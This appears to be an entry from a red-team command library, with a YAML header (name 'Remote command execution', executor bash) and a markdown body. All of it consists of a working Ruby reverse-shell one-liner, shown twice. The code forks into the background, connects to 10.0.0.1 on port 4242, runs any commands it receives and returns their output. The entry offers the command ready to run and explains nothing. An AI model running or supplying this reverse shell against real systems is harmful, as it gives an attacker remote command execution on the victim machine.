---
id: 3e95b4a2-eeb4-4e2b-9d07-f11e82265c43
name: Remote command execution
type: command
executor: bash
data: 'ruby -rsocket -e''exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit!
  if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue
  c.puts "failed: #{$_}"}'''
output: null
created_at: '2023-04-06T03:56:24.309575+00:00'
updated_at: '2023-04-10T20:25:24.555565+00:00'
---

# Remote command execution

```bash
ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.0.0.1","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
```


